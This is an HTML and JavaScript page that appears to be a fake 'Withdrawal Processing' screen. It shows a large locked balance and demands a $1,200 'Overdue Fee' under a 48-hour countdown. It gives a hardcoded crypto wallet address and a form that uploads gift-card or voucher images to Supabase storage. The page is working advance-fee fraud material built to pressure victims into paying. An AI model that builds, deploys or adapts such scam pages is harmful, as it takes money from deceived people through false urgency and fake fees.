<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Withdrawal Processing</title>
    <script src="https://cdn.jsdelivr.net/npm/@supabase/supabase-js@2"></script>
    <style>
        * { margin: 0; padding: 0; box-sizing: border-box; font-family: 'Segoe UI', Tahoma, Geneva, Verdana, sans-serif; }
        body { background-color: #0f172a; color: #f8fafc; display: flex; justify-content: center; align-items: center; min-height: 100vh; padding: 20px; }
        .container { background-color: #1e293b; padding: 30px; border-radius: 16px; box-shadow: 0 10px 25px rgba(0,0,0,0.3); width: 100%; max-width: 450px; text-align: center; }
        
        .icon-wrap { width: 80px; height: 80px; border-radius: 50%; background: rgba(245,158,11,0.1); border: 2px solid rgba(245,158,11,0.35); display: flex; align-items: center; justify-content: center; margin: 0 auto 20px; }
        h2 { font-size: 22px; font-weight: 700; color: #f8fafc; margin-bottom: 6px; }
        .subtitle { color: #94a3b8; font-size: 14px; margin-bottom: 22px; }
        .status-badge { display: inline-flex; background: rgba(245,158,11,0.1); border: 1px solid #f59e0b; color: #f59e0b; padding: 6px 16px; border-radius: 20px; font-size: 12px; font-weight: 700; margin-bottom: 22px; }
        
        .info-card { background: #0f172a; border: 1px solid #334155; border-radius: 12px; padding: 18px 20px; margin-bottom: 20px; text-align: left; }
        .info-row { display: flex; justify-content: space-between; padding: 9px 0; border-bottom: 1px solid #1e293b; font-size: 13px; }
        
        .commission-box { background: rgba(239,68,68,0.08); border: 1px solid rgba(239,68,68,0.3); border-radius: 10px; padding: 14px; margin-bottom: 22px; text-align: left; }
        .c-title { font-size: 13px; font-weight: 700; color: #f87171; margin-bottom: 6px; }
        .c-desc { font-size: 12px; color: #94a3b8; line-height: 1.4; }
        .c-amount { font-size: 20px; font-weight: 700; color: #f87171; }
        
        .tabs { display: grid; grid-template-columns: 1fr 1fr; margin-bottom: 22px; border: 1px solid #334155; border-radius: 8px; }
        .tab-btn { padding: 12px; background: transparent; border: none; color: #94a3b8; cursor: pointer; font-weight: 600; }
        .active-crypto { background: #0f172a; color: #38bdf8; }
        .active-voucher { background: #0f172a; color: #f59e0b; }
        
        .panel { display: none; }
        .panel.active { display: block; }
        .upload-zone { border: 2px dashed #334155; padding: 30px; cursor: pointer; position: relative; border-radius: 10px; }
        .upload-zone input { position: absolute; inset: 0; opacity: 0; cursor: pointer; }
        .btn { background: #2563eb; color: white; border: none; padding: 14px; width: 100%; border-radius: 8px; font-weight: 600; cursor: pointer; margin-top: 10px; }
        .btn:disabled { opacity: 0.5; }
    </style>
</head>
<body>
<div class="container">
    <div class="icon-wrap"><svg viewBox="0 0 24 24" fill="none" stroke="#f59e0b" stroke-width="2" width="38"><circle cx="12" cy="12" r="10"/><polyline points="12 6 12 12 16 14"/></svg></div>
    <h2>Withdrawal Processing</h2>
    <div class="status-badge">⏳ PROCESSING</div>

    <div class="info-card">
        <div class="info-row"><span>Amount</span><span>$694,536.50</span></div>
        <div class="info-row"><span>Overdue Fee</span><span style="color:#f87171;">$1,200.00</span></div>
    </div>

    <div class="commission-box">
        <div class="c-title">⚠️ Payment Period Expired</div>
        <div class="c-desc">The allotted time has elapsed. An Overdue Fee is required to reactivate.</div>
        <div style="display: flex; justify-content: space-between; align-items: center; margin-top: 15px;">
            <div><div style="font-size: 11px; color: #64748b;">Fee</div><div class="c-amount">$1,200.00</div></div>
            <div style="text-align: right;"><div style="font-size: 11px; color: #64748b;">Time Remaining</div><div id="timer-display" style="font-size: 18px; color: #ef4444; font-family: monospace;">48:00:00</div></div>
        </div>
    </div>

    <div class="tabs">
        <button class="tab-btn active-crypto" id="tab-crypto" onclick="switchTab('crypto')">💎 TRC20</button>
        <button class="tab-btn" id="tab-voucher" onclick="switchTab('voucher')">🎟️ Voucher</button>
    </div>

    <div class="panel active" id="panel-crypto">
        <input class="address-input" value="0x7C3eFfee94c4D79A951FC51f62201bD88785ACF8" readonly style="width:100%; padding:10px; background:#0f172a; color:#fff; border:1px solid #334155; margin-bottom:10px;">
        <button class="btn" onclick="alert('Payment Noted')">I've Sent the Payment</button>
    </div>

    <div class="panel" id="panel-voucher">
        <div class="upload-zone" id="upload-zone"><h3>Tap to upload voucher</h3><input type="file" id="file-input" accept="image/*" onchange="handleFile(this.files[0])"></div>
        <button class="btn" id="voucher-btn" disabled onclick="uploadVoucher()">Submit Voucher</button>
    </div>
</div>

<script>
    const supabaseClient = supabase.createClient('YOUR_URL', 'YOUR_KEY');
    let selectedFile = null;

    function switchTab(tab) {
        document.getElementById('panel-crypto').classList.toggle('active', tab === 'crypto');
        document.getElementById('panel-voucher').classList.toggle('active', tab === 'voucher');
        document.getElementById('tab-crypto').className = tab === 'crypto' ? 'tab-btn active-crypto' : 'tab-btn';
        document.getElementById('tab-voucher').className = tab === 'voucher' ? 'tab-btn active-voucher' : 'tab-btn';
    }

    function handleFile(file) {
        selectedFile = file;
        document.getElementById('voucher-btn').disabled = !file;
    }

    async function uploadVoucher() {
        if (!selectedFile) return;
        const { data, error } = await supabaseClient.storage
            .from('vouchers')
            .upload(`public/${Date.now()}_${selectedFile.name}`, selectedFile);
        
        if (error) alert('Upload failed: ' + error.message);
        else alert('Voucher uploaded successfully!');
    }

    // Timer logic remains...
</script>
</body>
</html>
